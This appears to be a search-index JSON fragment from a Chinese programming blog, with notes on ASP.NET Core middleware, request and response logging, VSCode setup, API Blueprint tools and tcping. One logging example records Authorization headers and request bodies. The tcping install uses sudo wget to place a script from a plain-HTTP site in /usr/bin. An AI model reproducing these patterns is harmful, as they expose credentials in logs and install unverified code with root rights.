方法","uri":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"JSON 快速產生 Class Convert JSON to C# Classes Online - Json2CSharp Toolkit 中文會有問題，但這個簡單又好用。 Instantly parse JSON in any language | quicktype 功能強大，不過平常是不會用這個。可以參考下面設定可以拿到一般 string 型別。 Info 其實這個也是要寫一篇文章筆記，但沒想到這邊先用上去了。 ","date":"2023-06-22","objectID":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/:2:0","tags":["excel","json","tool"],"title":"Excel 轉成 JSON 方法","uri":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"彩蛋 如何在 Microsoft Office Excel 搜尋與取代斷行符號 | The Will Will Web Excel 換行取代、Excel 用 Studio Management 匯入到資料庫 如何在 Microsoft Office Excel 搜尋與取代斷行符號 | The Will Will Web https://www.jianshu.com/p/fb02bdcf1000 原本要採用這個方式，手動整理資料，然後再用資料匯入到資料庫，但怎麼處理也沒有一般寫程式方便，因為時間有限，所以就沒有採用這個方法，不過這個好像也是記錄程式筆記方式，有空試試看。 Convert Excel to JSON | XLS to JSON | XLSX to JSON in C# Export Excel data to JSON format in C#, VB.NET | Syncfusion [.Net] 使用Microsoft.Office.Interop.Excel 轉Json及DataTable | 愛比的新手筆記 - 點部落 其他彩蛋 使用 Json.NET 與 QuickType 搭配字串轉 Enum 的絕佳解決方案 | The Will Will Web 重新認識 quicktype 與 Paste JSON as Code 擴充套件 - YouTube ","date":"2023-06-22","objectID":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/:3:0","tags":["excel","json","tool"],"title":"Excel 轉成 JSON 方法","uri":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"中間件(Middleware)在程式架構上設計是很重要功能，之前我在學習 Spring Boot 對應 Request 所對應處理都使用 AOP，AOP概念很像 Middleware，但還是有點差異的，要如何使用 Middleware 讓開發程式更有效率、簡單，不需要異動程式這是很重要的。 這個筆記很久之前就寫完了，但想說有空再整理一下，結果都沒改什麼東西。最近剛好寫中間件文章，覺得還是整理出來好了。 處理 HTTP Request，很重要的管道。例如: 網頁帳號檢查、錯誤的處理。 …-\u003eLogging -\u003eStaticFiles -\u003e MVC -\u003e… ASP.NET Core 中間件 Logging 記錄使用者 IP等資訊 StaticFiles 取得js/img靜態文件 MVC 終端中間件。 可做到的事情: 可同時被訪問和請求 可處理請求後，然後將請求傳遞給下一個中間件 可以處理請求後，并使管道短路。 可以處理傳出響應。 中間件是按照添加的順序執行的。 官方順序可以參考: ASP.NET Core 中介軟體 | Microsoft Docs ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:0:0","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"中間件範列 靜態文件建立需要建立 wwwroot app.Run()是一個終端中間件，他使用會短路。 下面範例只會印出Hello World1 app.Run(async (context)=\u003e{ await context.Response.WriteAsync(\"hello world 1\"); }); app.Run(async (context)=\u003e{ await context.Response.WriteAsync(\"hello world 2\"); }); app.Use可以解決這個問題，使用 next可調用到下一個 Middleware。 app.Use(async (context,next)=\u003e{ context.Response.ContentType = \"text/plain;charset=utf-8\"; await context.Response.WriteAsync(\"hello world 1\"); await next(); }); app.Run(async (context)=\u003e{ await context.Response.WriteAsync(\"hello world 2\"); ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:1:0","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"靜態文件 //靜態文件中間件 app.UseStaticFiles(); UseDefaultFiles一定要放在 UseStaticFiles 前面。 //加入默認文件中間件 index.html index.htm default.html default.htm app.UseDefaultFiles(); 更改預設 html網頁; DefaultFilesOptions defaultFilesOptions = new DefaultFilesOptions(); defaultFilesOptions.DefaultFileNames.Clear(); defaultFilesOptions.DefaultFileNames.Add(\"hello.html\"); app.UseDefaultFiles(defaultFilesOptions); 這邊太長了 // app.UseFileServer(); // 結合UseStaticFiles, UseDefaultFiles, UseDirectoryBrowser // app.UseDirectoryBrowser(); // 查看文件夾內容 FileServerOptions fileServerOptions = new FileServerOptions(); fileServerOptions.DefaultFilesOptions.DefaultFileNames.Clear(); fileServerOptions.DefaultFilesOptions.DefaultFileNames.Add(\"hello.htm\"); app.UseFileServer(fileServerOptions); app.use...有很多中間件可以用。 ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:2:0","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"異常頁面中間件 盡量放在中間件前面，預防其他錯誤，否則不會跑出結果。 // 盡量放在中間件前面，預防其他錯誤，否則不會跑出結果 if(env.IsDevelopment()){ app.UseDeveloperExceptionPage(); } ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:3:0","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"自定義中間件異常 DeveloperExceptionPageOptions developerExceptionPageOptions = new DeveloperExceptionPageOptions(); developerExceptionPageOptions.SourceCodeLineCount = 1; app.UseDeveloperExceptionPage(developerExceptionPageOptions); .Net 6 之前版本要怎麼辦? 我之前有寫過這篇.Net Core Middleware 擷取 Request 參數 - 程式狂想筆記可以參考。 ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:3:1","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"其他文章 ASP.NET Core 基礎 - Middleware-黑暗執行緒 ASP.NET Core 运行原理解剖[3]:Middleware-请求管道的构成 - 雨夜朦胧 - 博客园 c# - How To Register Services For Custom .Net Core Middleware - Stack Overflow 收集 ASP.NET Core 網站所有的 HTTP Request 資訊 Global Error Handling in ASP.NET Core Web API - Code Maze ","date":"2023-06-22","objectID":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/:4:0","tags":[".netcore"],"title":"ASP.NET Core 中間件(Middleware)","uri":"/blog/posts/ASP.NET-Core-%E4%B8%AD%E9%96%93%E4%BB%B6-Middleware/"},{"categories":[".Net Core"],"content":"相信大家前期 debug 需要做這些事情，有時候每隻寫一隻印出來，不如全部印出來。但我不建議全部印出來。 Warning 這是一個新手入3個月寫的，品質不敢保證，但我目前用應該不會跑出任何錯誤。大致上除錯還算滿方便。 ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:0:0","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"最終範例 設定檔isLogShowHeader 和 IsLogShowPostBody 看需求是不是要設定，預設為false。 public class RequestSpendTimeMiddleWare { private DateTime _startTime; private readonly RequestDelegate _next; private readonly ILogger\u003cRequestSpendTimeMiddleWare\u003e _logger; private readonly IConfiguration _configuration; public RequestSpendTimeMiddleWare(RequestDelegate next, ILogger\u003cRequestSpendTimeMiddleWare\u003e logger, IConfiguration configuration) { _next = next; _logger = logger; _configuration = configuration; } public async Task InvokeAsync(HttpContext context) { _logger.LogInformation(\"┌-----------------------------------┐\"); _logger.LogInformation(\"Path: {path}\", context.Request.Path); _logger.LogInformation(\"Method: {method}\", context.Request.Method); bool isLogShowHeader = IsLogShowHeader(); if (isLogShowHeader) { _logger.LogInformation(\"Header: {Header}\", context.Request.Headers); } _logger.LogInformation(\"Content-Type: {contentType}\", context.Request.ContentType); _logger.LogInformation(\"Query: {query}\", context.Request.Query); bool IsLogShowPostBody = this.IsLogShowPostBody(); _logger.LogInformation(\"showPostBody: {showPostBody}\", IsLogShowPostBody); if (IsLogShowPostBody) { _logger.LogInformation(\"Body: {body}\", await GetPostBody(context)); } _startTime = DateTime.Now; // Call the next delegate/middleware in the pipeline await _next(context); _logger.LogInformation(\"執行花費：\" + (DateTime.Now - _startTime).TotalSeconds.ToString() + \"s\"); _logger.LogInformation(\"└-----------------------------------┘\"); } private bool IsLogShowHeader() { return _configuration.GetValue\u003cbool\u003e(\"IsLogShowHeader\"); } private bool IsLogShowPostBody() { return _configuration.GetValue\u003cbool\u003e(\"IsLogShowPostBody\"); } private static async Task\u003cstring\u003e GetPostBody(HttpContext context) { if (context.Request.Method == \"GET\") { return \"\"; } else if (context.Request.Method == \"POST\" \u0026\u0026 context.Request.ContentType.Contains(\"multipart/form-data;\")) { return JsonConvert.SerializeObject(context.Request.Form); } else { return await GetBody(context); } } private static async Task\u003cstring\u003e GetBody(HttpContext context) { string body; context.Request.EnableBuffering(); using (var reader = new StreamReader(context.Request.Body, Encoding.UTF8, true, 1024, true)) { body = await reader.ReadToEndAsync(); } context.Request.Body.Position = 0; return body; } } ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:1:0","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"問題記錄 using (var reader = new StreamReader(context.Request.Body)) { requestContent = await reader.ReadToEndAsync(); if (!string.IsNullOrEmpty(requestContent)) { context.Request.Body.Seek(0, SeekOrigin.Begin); } } 實際上跑出 錯誤。 ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:2:0","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"解決方法 參照這篇c# - How to get HttpRequest body in .net core? - Stack Overflow寫法我們看到EnableRewind .Net Core不能用。後來這篇.NET Core 3.0 的重大變更 - .NET | Microsoft Docs看到改變寫法。 改完發現使用同步方法會有問題，找到Synchronous operations are disallowed. Call ReadAsync or set AllowSynchronousIO to true instead. - 天马3798 - 博客园調整設定就可以。但我覺得不需要這麼做，把程式調整非同步就能解決了。 private static async Task\u003cstring\u003e GetBody(HttpContext context) { string body; context.Request.EnableBuffering(); using (var reader = new StreamReader(context.Request.Body, Encoding.UTF8, true, 1024, true)) { body = await reader.ReadToEndAsync(); } context.Request.Body.Position = 0; return body; } 其他寫法，但我就不成功就是了，不知他們為什麼能跑… ASP.NET Core 问题排查：Request.EnableRewind 后第一次读取不到 Request.Body - dudu - 博客园 ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:2:1","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"舊版程式(留記錄，不要使用) ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:3:0","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"v1 public class CheckXxxMiddleware { private readonly RequestDelegate _next; private readonly ILogger\u003cCheckXxxMiddleware\u003e _logger; private readonly IConfiguration _configuration; private readonly int HttpXxxValidResult = 400; public CheckXxxMiddleware(RequestDelegate next, ILogger\u003cCheckXxxMiddleware\u003e logger, IConfiguration configuration) { _next = next; _logger = logger; _configuration = configuration; } public async Task Invoke(HttpContext context) { string tsString = await GetTsString(context); if (string.IsNullOrEmpty(tsString)) { context.Response.StatusCode = HttpCodeValidResult; return; } ... } private async Task\u003cstring\u003e GetXxxString(HttpContext context) { string requestContent; _logger.LogInformation(\"Method:{method}\", context.Request.Method); _logger.LogInformation(\"Path:{path}\", context.Request.Path); _logger.LogInformation(\"Content-Type:{contentType}\", context.Request.ContentType); _logger.LogInformation(\"Query:{query}\", context.Request.Query); if (context.Request.Method == \"POST\" \u0026\u0026 context.Request.ContentType.Contains(\"multipart/form-data;\")) { var data = context.Request.Form; _logger.LogDebug(\"data:{data}\", data); if (data.ContainsKey(\"Xxx\")) { _logger.LogInformation(\"Xxx:{Xxx}\", data[\"Xxx\"]); return data[\"Xxx\"]; } } else if (context.Request.Method == \"POST\" \u0026\u0026 context.Request.ContentType.Contains(\"application/x-www-form-urlencoded\")) { context.Request.EnableBuffering(); using (var reader = new StreamReader(context.Request.Body)) { requestContent = await reader.ReadToEndAsync(); if (!string.IsNullOrEmpty(requestContent)) { context.Request.Body.Seek(0, SeekOrigin.Begin); } } _logger.LogInformation(\"Body:{requestContent}\", requestContent); if (requestContent != null) { var queryString = Microsoft.AspNetCore.WebUtilities.QueryHelpers.ParseQuery(requestContent); _logger.LogInformation(\"queryString:{queryString}\", queryString); if (queryString.ContainsKey(\"Xxx\")) { _logger.LogInformation(\"Xxx:{Xxx}\", queryString[\"Xxx\"]); } return queryString[\"Xxx\"]; } } else if (context.Request.Method == \"POST\" \u0026\u0026 context.Request.ContentType.Contains(\"json\")) //application/json { context.Request.EnableBuffering(); using (var reader = new StreamReader(context.Request.Body)) { requestContent = await reader.ReadToEndAsync(); if (!string.IsNullOrEmpty(requestContent)) { context.Request.Body.Seek(0, SeekOrigin.Begin); } } _logger.LogInformation(\"Body:{requestContent}\", requestContent); if (requestContent != null) { var dict = JsonConvert.DeserializeObject\u003cDictionary\u003cstring, string\u003e\u003e(requestContent); _logger.LogInformation(\"dynamicObject:{d}\", dict); if (dict.ContainsKey(\"Xxx\")) { _logger.LogInformation(\"Xxx:{Xxx}\", dict[\"Xxx\"]); return dict[\"Xxx\"]; } } } else { if (context.Request.Query.ContainsKey(\"Xxx\")) { return context.Request.Query[\"Xxx\"]; } } return null; } } ","date":"2023-06-22","objectID":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/:3:1","tags":[".netcore"],"title":".Net Core Middleware 擷取 Request 參數","uri":"/blog/posts/Net-Core-Middleware-%E6%93%B7%E5%8F%96-Request-%E5%8F%83%E6%95%B8/"},{"categories":[".Net Core"],"content":"常常我們維運時候，沒有記錄一些 log，遇到問題也不知道發生了什麼。最近做一個專案被告知需要紀錄這些資訊，怕線上遇到問題不知道是什麼問題就很難處理。 ","date":"2023-06-22","objectID":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/:0:0","tags":[".netcore"],"title":".Net 紀錄訪問 Server Request Response Body 方法","uri":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":".Net 6 紀錄 log 大法 .Net 6 原生支援，加上去你的 log 就可以看到 Request 相關資訊。 app.UseHttpLogging(); ","date":"2023-06-22","objectID":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/:1:0","tags":[".netcore"],"title":".Net 紀錄訪問 Server Request Response Body 方法","uri":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"紀錄 request, response ,header 內容 這邊你會發現 Response 沒有 Body 內容，這邊可以打開。 // HttpLogging builder.Services.AddHttpLogging(logging =\u003e { logging.LoggingFields = HttpLoggingFields.All; logging.RequestHeaders.Add(\"Authorization\"); logging.RequestBodyLogLimit = 4096; logging.ResponseBodyLogLimit = 4096; }); logging.LoggingFields 為 HttpLoggingFields.RequestPropertiesAndHeaders | HttpLoggingFields.ResponsePropertiesAndHeaders;。 Warning 奇怪，你一定會覺得很奇怪，怎麼ResponsePropertiesAndHeaders沒有紀錄 Response Body 內容。 Flag for logging HTTP Response properties and headers. Includes ResponseStatusCode and ResponseHeaders 那RequestPropertiesAndHeaders沒有紀錄 Authorization， Flag for logging the HTTP Request Headers. Request Headers are logged as soon as the middleware is invoked. Headers are redacted by default with the character ‘[Redacted]’ unless specified in the RequestHeaders. For example: Connection: keep-alive My-Custom-Request-Header: [Redacted] 預設RequestBodyLogLimit和ResponseBodyLogLimit為32kb，所以可以不用調整這個東西。 這邊預設 Authorization 是不會記錄到 header 上面，這邊可以把這個資訊紀錄到 log。 其他相關 HTTP Logs With ‘UseHttpLogging’ Middleware[.NET6 Feature] c# - How to read ASP.NET Core Response.Body? - Stack Overflow Log http requests/responses using ASP.NET Core HttpLoggingMiddleware Log Requests and Responses in ASP.NET Core 3 | by Eric Anderson | ITNEXT ","date":"2023-06-22","objectID":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/:1:1","tags":[".netcore"],"title":".Net 紀錄訪問 Server Request Response Body 方法","uri":"/blog/posts/Net-%E7%B4%80%E9%8C%84%E8%A8%AA%E5%95%8F-Server-Request-Response-body-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"最近工作使用 Visual Studio 開發，但家裡想使用輕量級 VSCode 去開發 .Net 程式。使用 VSCode 真的跟 Visual Studio 差很多，但最近找到比較快的方式去開發，這邊整理一下。 ","date":"2023-06-22","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/:0:0","tags":[".netcore"],"title":"快速五分鐘設定好 Visual Studio Code 開發 .Net","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/"},{"categories":[".Net Core"],"content":"操作流程 安裝 vscode, .net 程式 安裝套件 .NET Core Extension Pack - Visual Studio Marketplace 設定 setting.json 啟動載入 extension method class(此設定不一定要做) This is a tip 這個不一定要設定，我發現 .Net 6 之後有 ImplicitUsings，在使用時候不需要再 using，也許把常用的 extension method class 放在這邊應該比較方便。舊專案會發現很難開，這邊就建議使用。 對應 Visual Studio 顯示詳細是Ctrl + Jx2，這邊可以參考.Net Core 和 Visual Studio 2022 安裝設定與使用技巧 - 程式狂想筆記。 { \"editor.fontFamily\": \"Consolas, '微軟正黑體', 'Courier New', monospace\", \"omnisharp.enableImportCompletion\": true } dotnet cli 建置專案 mkdir webProject dotnet new webapi This is a tip 這邊分層可以參考Visual Studio 做 Net Core 專案分層 - 程式狂想筆記 參照下圖去做操作，就可以用 debug 執行。執行會開啟網頁，但是不會導致 /swagger/目錄，這邊需要手動建置。 更多 EF和 Controller新增檔案可以參考: 如何使用 .NET CLI 快速產生 ASP․NET Core 的 Controllers 與 Views 程式碼 | The Will Will Web 這個流程開發起手勢還滿快的。 ","date":"2023-06-22","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/:1:0","tags":[".netcore"],"title":"快速五分鐘設定好 Visual Studio Code 開發 .Net","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/"},{"categories":[".Net Core"],"content":"彩蛋 改用 VSCode 開發 ASP.NET Core 心得-黑暗執行緒 (15) VS Code e .NET 6, Configuração + CRUD WebAPI - YouTube 還原工程 - EF Core | Microsoft Learn ","date":"2023-06-22","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/:2:0","tags":[".netcore"],"title":"快速五分鐘設定好 Visual Studio Code 開發 .Net","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E4%BA%94%E5%88%86%E9%90%98%E8%A8%AD%E5%AE%9A%E5%A5%BD-VSCode-%E9%96%8B%E7%99%BC-DotNet/"},{"categories":["實用工具"],"content":"最近不小心誤坑了 API Blueprint ，提醒大家轉 OpenAPI Specification (OAS) 才是王道。但還是最近找一下實用工具。 Warning 注意!!最近幾年很少有 API Blueprint 工具，原因大多轉為 OpenAPI Specification (OAS)，此文章不建議使用，這邊只是特別留紀錄。 ","date":"2023-06-11","objectID":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/:0:0","tags":["openapi","api","blueprint"],"title":"API Blueprint 實用工具小記","uri":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"vscode ","date":"2023-06-11","objectID":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/:1:0","tags":["openapi","api","blueprint"],"title":"API Blueprint 實用工具小記","uri":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"API Elements extension 大部分功能不能用，他可以用apiary申請 token 使用，但沒有用 apiary 情況下，大部分功能都不能用，不過他可以轉成本機 apiary 文件還算馬方便的。 但這個有些欄位值含有-會有問題。目前用 ` 包起來可以解決問題，但轉出來html會做htmlencode，後來發現把它換成 \\` 可以解決問題，但還是不好用。 裡面也會讓你的 vsCode 有 lint 檢查格式方法，但是不是每一個都會檢查。 ","date":"2023-06-11","objectID":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/:1:1","tags":["openapi","api","blueprint"],"title":"API Blueprint 實用工具小記","uri":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"API Blueprint Viewer 可以在 vsCode 預覽內容，但有很大的問題。當格式失敗不會顯示有錯誤，在撰寫中有錯誤格是很麻煩，當你寫錯時候不會知道你有寫錯，找錯誤在哪個地方也很麻煩。 ","date":"2023-06-11","objectID":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/:1:2","tags":["openapi","api","blueprint"],"title":"API Blueprint 實用工具小記","uri":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"轉 OpenAPI 工具 OpenAPI 有太多好用工具，這邊有個 apib2swagger 工具還滿不錯。再轉乘 redoc 也不錯看。 kminami/apib2swagger: Convert API Blueprint to Swagger 2.0 or OpenAPI 3.0. ","date":"2023-06-11","objectID":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/:2:0","tags":["openapi","api","blueprint"],"title":"API Blueprint 實用工具小記","uri":"/blog/posts/API-Blueprint-%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"在一般網路我們都使用 ping 指令去做測試網路狀況，但大多安全行關係，防火牆會把 ICMP 封鎖，導致無法測試網路，只能連該服務 port。最近公司網路出點狀況，之前有用過 MTR 測試網路狀況(參考:Java 遇到 connection timed out 問題 - 程式狂想筆記)，但這次不能做 traceroute，再找找有沒有查詢方法，結果發現這個好玩的東西。 ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:0:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"工作原理 traceroute:IP路由過程中對封包TTL(Time to Live，存活時間)進行處理。當路由器收到一個IP包時，會修改IP包的TTL（及由此造成的頭部檢驗和checksum變化）。每收到一個包，檢查這個 的TTL是否是0。如果是，表明這個包還沒有到達目的地，而且剩餘時間不多了，肯定是到不了目的地了。這樣路由器就簡單地丟棄這個包，並給源主機傳送 ICMP通知，說這個包已經超時了。ICMP的通知資訊裡包含當前路由器傳送時所用的IP。這樣就可以通過構造封包，來間接檢查到達一個主機時經過了哪些路由。一開始傳送一個TTL為1的包，這樣到達第一個路由器的時候就已經超時了，第一個路由器就發通知說包超時，這樣就可以記錄下 所經過的第一個路由器的IP。然後TTL加1，安全通過第一個路由器，而第二個路由器的的處理與第一個相同，丟包，發通知說包超時了，這樣記錄下第二個路 由器IP，由此可以一直進行下去，直到這個封包到達目標主機，由此列印出所有經過的路由器。 tcptraceroute：現代網路廣泛使用防火牆，導致傳統路由跟蹤工具發出的（ICMP應答（ICMP echo）或UDP）封包都被過濾掉了，所以無法進行完整的路由跟蹤。儘管如此，許多情況下，防火牆會准許TCP封包通過防火牆到達指定連接埠，這些連接埠是主機內防火牆背後的一些程序和外界連接用的。通過傳送TCP SYN封包來代替UDP或者ICMP應答封包，tcptraceroute可以穿透大多數防火牆。 參考: 路由追蹤：traceroute/tcptraceroute - 思卻 - 部落格園 ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:1:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"安裝 參考: 用 tcp 协议的 traceroute 测试连接是否经过透明代理 Linux下网络测试工具tcpping、tcptraceroute的使用_51CTO博客_linux 网络测试工具 ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:2:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"Ubuntu 安裝 sudo apt install tcptraceroute sudo wget http://www.vdberg.org/~richard/tcpping -O /usr/bin/tcping sudo chmod 755 /usr/bin/tcping 執行發生錯誤可能需要再安裝bc。 ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:2:1","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"Window 安裝 可直接 scoop 快速安裝。可以看Scoop - Apps (tcping) scoop bucket add main scoop install tcping ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:2:2","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"使用 tcping 方法 tcping tw.yahoo.com 443 可以看到連線結果。你會發現有時候會回 No Response，代表網路沒通。 ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:3:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 